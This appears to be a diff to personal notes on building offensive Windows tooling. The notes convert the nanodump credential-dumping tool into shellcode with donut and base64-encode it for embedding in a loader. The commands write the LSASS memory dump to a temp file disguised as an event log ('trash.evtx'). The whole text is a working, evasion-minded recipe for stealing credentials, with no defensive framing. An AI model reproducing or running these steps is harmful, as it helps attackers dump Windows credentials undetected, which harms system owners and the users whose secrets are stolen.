@@ -29,7 +29,7 @@ Things for myself
 // use "x64 Native Tools for VS" for nmake for donut and nanodump 
 
 # Create donut'ed nanodump - change parameters 
-./donut.exe -i nanodump\dist\nanodump.x64.exe -b=1 -p "--valid --write C:\windows\temp\trash.evtx" -o <somewhere>\nanodump.bin
+./donut.exe -i nanodump\dist\nanodump.x64.exe -b=1 -t -p "--valid --write C:\windows\temp\trash.evtx" -o <somewhere>\nanodump.bin
 
 # Copy/paste the nanodump base64 to here, and compile. 
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("<somewhere>nanodump.bin")) | clip
